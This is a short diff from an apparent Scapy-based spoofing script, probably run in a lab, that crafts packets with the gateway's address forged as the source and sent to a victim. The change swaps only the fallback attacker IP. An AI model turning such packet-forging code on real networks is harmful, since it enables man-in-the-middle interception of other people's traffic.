@@ -19,7 +19,7 @@ def main():
     prefix = sys.argv[4] if len(sys.argv) > 4 else "0.0.0.0/0"
     conf.iface = iface
     vmac = resolve(victim, iface)
-    att_ip = getattr(conf.iface, "ip", None) or "10.10.10.66"
+    att_ip = getattr(conf.iface, "ip", None) or "172.16.10.66"
     target_ip = prefix.split("/")[0]
     pkt = (Ether(src=get_if_hwaddr(iface), dst=vmac) /
            IP(src=gateway, dst=victim) /              # "a gateway-től"
